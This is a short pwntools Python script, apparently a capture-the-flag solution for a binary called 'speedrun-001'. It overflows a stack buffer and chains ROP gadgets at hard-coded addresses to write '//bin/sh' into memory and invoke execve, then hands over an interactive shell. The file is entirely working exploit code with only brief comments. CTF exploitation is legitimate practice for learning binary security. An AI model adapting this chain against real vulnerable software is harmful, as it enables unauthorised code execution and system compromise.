from pwn import *

pwn = process('./speedrun-001')
#gdb.attach(pwn, '''
#b *0x00400bad
#continue
#''')

######### TOYS ###################################################
junk = b'A' * 1032

www = p64(0x000000000048d251) # mov qword ptr [rax], rdx; ret; 
 
pop_rax = p64(0x0000000000415664)# pop rax; ret;
pop_rdx = p64(0x000000000044be16) # pop rdx; ret; 
pop_rdi = p64(0x0000000000400686) # pop rdi; ret;
pop_rsi = p64(0x00000000004101f3) # pop rsi; ret;
syscall = p64(0x000000000040129c)

where = p64(0x006bb2e0)
what = b'\x2f\x2f\x62\x69\x6e\x2f\x73\x68'
#################################################################

buf = junk

# get where into rax
buf += pop_rax
buf += where

# get what into rdx
buf += pop_rdx
buf += what

# execute www
buf += www

# set up syscall to execve
# put syscall number 0x3b into rax
buf += pop_rax
buf += p64(0x3b)

# put where into rdi
buf += pop_rdi
buf += where 

# put null into rsi
buf += pop_rsi
buf += p64(0)

# put null into rdx
buf += pop_rdx
buf += p64(0)

# syscall
buf += syscall

pwn.sendline(buf)
pwn.interactive()
